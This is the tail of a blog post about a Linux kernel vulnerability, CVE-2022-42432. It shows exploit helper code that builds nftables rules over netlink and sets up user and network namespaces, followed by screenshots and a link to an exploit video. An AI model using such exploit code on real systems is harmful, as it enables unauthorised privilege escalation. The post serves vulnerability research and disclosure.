</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_rule</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span> r)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret;
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			NFT_MSG_NEWRULE,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">nftnl_rule_get_u32</span>(r, NFTNL_RULE_FAMILY),
</span></span><span style="display:flex;"><span>			NLM_F_APPEND<span style="color:#f92672">|</span>NLM_F_CREATE<span style="color:#f92672">|</span>NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, r);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_free</span>(r);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_sendto&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_recvfrom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl), NULL, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_cb_run&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_meta</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> key, <span style="color:#66d9ef">uint32_t</span> dreg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;meta&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_META_KEY, key);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_META_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_cmp</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> sreg, <span style="color:#66d9ef">uint32_t</span> op,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">uint32_t</span> data_len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;cmp&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr cmp oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_CMP_SREG, sreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_CMP_OP, op);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set</span>(e, NFTNL_EXPR_CMP_DATA, data, data_len);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_payload</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> base, <span style="color:#66d9ef">uint32_t</span> sreg, <span style="color:#66d9ef">uint32_t</span> dreg, <span style="color:#66d9ef">uint32_t</span> offset, <span style="color:#66d9ef">uint32_t</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;payload&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_BASE, base);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(sreg <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(dreg <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_LEN, len);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add_verdict</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">int</span> verdict, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain, <span style="color:#66d9ef">u_int32_t</span> dreg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;immediate&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_VERDICT, verdict);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(chain)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_str</span>(e, NFTNL_EXPR_IMM_CHAIN, chain);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">write_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(filename, O_RDWR);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, text, <span style="color:#a6e22e">strlen</span>(text));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">new_ns</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uid_t</span> uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getgid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unshare</span>(CLONE_NEWUSER <span style="color:#f92672">|</span> CLONE_NEWNS)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34; [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unshare</span>(CLONE_NEWNET)){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34; [-] unshare(CLONE_NEWNET)&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/setgroups&#34;</span>, <span style="color:#e6db74">&#34;deny&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), <span style="color:#e6db74">&#34;0 %d 1&#34;</span>, uid);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/uid_map&#34;</span>, buffer);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), <span style="color:#e6db74">&#34;0 %d 1&#34;</span>, gid);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/gid_map&#34;</span>, buffer);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef HEXDUMP_COLS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEXDUMP_COLS 16
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i, j;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> len <span style="color:#f92672">+</span> ((len <span style="color:#f92672">%</span> HEXDUMP_COLS) <span style="color:#f92672">?</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> len <span style="color:#f92672">%</span> HEXDUMP_COLS) <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>); i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print offset */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">%</span> HEXDUMP_COLS <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%06x: &#34;</span>, i);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print hex data */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">&lt;</span> len)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x &#34;</span>, <span style="color:#ae81ff">0xFF</span> <span style="color:#f92672">&amp;</span> ((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[i]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> <span style="color:#75715e">/* end of block, just aligning for ASCII dump */</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;   &#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print ASCII dump */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">%</span> HEXDUMP_COLS <span style="color:#f92672">==</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span>(j <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>); j <span style="color:#f92672">&lt;=</span> i; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(j <span style="color:#f92672">&gt;=</span> len) <span style="color:#75715e">/* end of block, not really printing */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39; &#39;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isprint</span>(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[j])) <span style="color:#75715e">/* printable char */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">0xFF</span> <span style="color:#f92672">&amp;</span> ((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[j]);        
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#75715e">/* other char */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CVE-2022-42432_Linux_kernel/4c1b58911a550f576d7eab2a629dc024.png" alt=""  />

<img loading="lazy" src="/blog/CVE-2022-42432_Linux_kernel/f2f0ce9b8a7525a9a6ab25700bd5a042.png" alt=""  />

<a href="https://youtu.be/p_VYklBtE4A">https://youtu.be/p_VYklBtE4A</a> Exploit</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/linux-kernel/">Linux kernel</a></li>
      <li><a href="https://msh1307.kr/tags/cve-2022-42432/">CVE-2022-42432</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
